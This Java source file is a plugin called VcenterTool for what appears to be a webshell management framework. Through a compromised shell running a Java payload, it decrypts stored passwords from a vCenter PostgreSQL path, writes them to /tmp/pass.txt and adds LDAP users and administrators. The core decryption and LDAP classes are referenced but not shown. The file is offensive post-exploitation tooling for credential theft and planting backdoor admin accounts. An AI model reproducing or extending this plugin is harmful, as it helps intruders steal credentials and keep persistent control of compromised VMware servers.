package shells.plugins.vc;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import org.fife.ui.rtextarea.RTextScrollPane;
import util.automaticBindClick;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.util.ArrayList;

@PluginAnnotation(payloadName = "JavaDynamicPayload",Name = "VcenterTool",DisplayName = "VcenterTool")
public class VcenterTool implements Plugin {

    private Encoding encoding;
    private RTextArea resultTextArea;
    private RTextScrollPane resultTextScrollPane;

    private ShellEntity shellEntity;
    private Payload payload;
    private JPanel corePanel;
    private JButton decryptButton;
    private JTextField psql;
    private JButton addUserButton;
    private JButton deleteUserButton;
    private JButton addAdminButton;
    private JTextField addUserText;
    private JTextField addAdminText;
    private JTextField deleteUserText;

    @Override
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = shellEntity.getPayloadModule();
        this.encoding = shellEntity.getEncodingModule();
        automaticBindClick.bindJButtonClick(this,this);
    }

    public ArrayList<String> doDecrypt(String psql_path) throws Exception {
        PasswordDecryptor passwordDecryptor = new PasswordDecryptor(this.shellEntity,this.payload,this.encoding);
        return passwordDecryptor.decryptor(psql_path);
    }

    public String doAddUser(String username) throws Exception{
        LdapManage ldapManage = new LdapManage(this.shellEntity,this.payload,this.encoding);
        return ldapManage.addUser(username);
    }


    public String doAddAdmin(String username) throws Exception{
        LdapManage ldapManage = new LdapManage(this.shellEntity,this.payload,this.encoding);
        return ldapManage.addAdmin(username);
    }

    public void decryptButtonClick(ActionEvent actionEvent) throws Exception {
        String psql_path = this.psql.getText();
        ArrayList<String> passwords = doDecrypt(psql_path);
        this.resultTextArea.append("\n");
        this.resultTextArea.append(passwords.toString());
        this.resultTextArea.append("\n");
        this.resultTextArea.append("save as /tmp/pass.txt");
    }

    public void addUserButtonClick(ActionEvent actionEvent) throws Exception{
        String username = this.addUserText.getText();
        String result = doAddUser(username);
        this.resultTextArea.append("\n");
        this.resultTextArea.append(result);
    }

    public void addAdminButtonClick(ActionEvent actionEvent) throws Exception{
        String username = this.addAdminText.getText();
        String result = doAddAdmin(username);
        this.resultTextArea.append("\n");
        this.resultTextArea.append(result);
    }

    public void deleteUserButtonClick(ActionEvent actionEvent) throws Exception{

    }



    @Override
    public JPanel getView() {
        return corePanel;
    }
}
